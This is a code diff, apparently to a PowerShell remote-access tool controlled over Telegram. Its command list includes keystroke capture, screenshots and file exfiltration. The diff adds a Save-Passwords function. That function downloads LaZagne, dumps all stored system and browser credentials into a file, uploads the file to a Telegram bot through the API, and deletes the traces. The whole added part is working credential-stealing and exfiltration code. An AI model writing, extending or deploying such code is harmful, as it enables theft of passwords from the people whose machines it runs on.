@@ -56,6 +56,7 @@ Folder-Tree    : Gets Dir tree and sends it zipped
 Screenshot   : Sends a screenshot of the desktop
 Key-Capture    : Capture Keystrokes and send
 Exfiltrate   : Sends files (see 'Extra-Info' for more)
+Save-Passwords : Gather all passwords from computer
 Upload      : Uploads a specific file (use -path)
 System-Info   : Send System info as text file
 Software-Info   : Send Software info as text file
@@ -195,6 +196,60 @@ $bitmap.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)
 $graphics.Dispose()
 $bitmap.Dispose()
 Post-File; rm -Path $filePath -Force
+}
+
+Function Save-Passwords{
+$Output = "C:\temp"
+$ResultFile = "$Output\$env:computername.txt"
+Start-BitsTransfer -Source "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe" -Destination "$Output/l.exe"
+Set-Location $Output
+Start-Sleep -Milliseconds 15000
+.\l.exe all -vv > "$env:computername.txt"; .\l.exe browsers -vv >> "$env:computername.txt"
+
+try {
+    # Create a byte array from the file
+    $FileStream = [System.IO.File]::OpenRead($ResultFile)
+    $FileBytes = [byte[]]::new($FileStream.Length)
+    $FileStream.Read($FileBytes, 0, $FileBytes.Length)
+    $FileStream.Close()
+
+    # Define the boundary for multipart form-data
+    $boundary = [System.Guid]::NewGuid().ToString()
+    $LF = "`r`n"
+
+    # Construct the multipart form-data content
+    $BodyLines = @(
+        "--$boundary",
+        "Content-Disposition: form-data; name=`"chat_id`"",
+        "",
+        $chatID,
+        "--$boundary",
+        "Content-Disposition: form-data; name=`"document`"; filename=`"$($ResultFile)`"",
+        "Content-Type: application/octet-stream",
+        "",
+        [System.Text.Encoding]::GetEncoding("iso-8859-1").GetString($FileBytes),
+        "--$boundary--",
+        ""
+    ) -join $LF
+
+    # Convert the body to a byte array
+    $BodyBytes = [System.Text.Encoding]::GetEncoding("iso-8859-1").GetBytes($BodyLines)
+
+    # Send the request to the Telegram API
+    $TelegramAPI = "https://api.telegram.org/bot$Token/sendDocument"
+    $Response = Invoke-RestMethod -Uri $TelegramAPI -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $BodyBytes
+
+# Send the result file
+Send-TelegramFile -Token $Token -chatID $chatID -FilePath $ResultFile
+
+# Cleanup
+Remove-Item $ResultFile, "$Output/l.exe" -Force -ErrorAction SilentlyContinue
+}
+    catch [System.Exception]
+    {
+        write $_ 
+        return 'test'
+    }
 }
 
 Function Key-Capture {
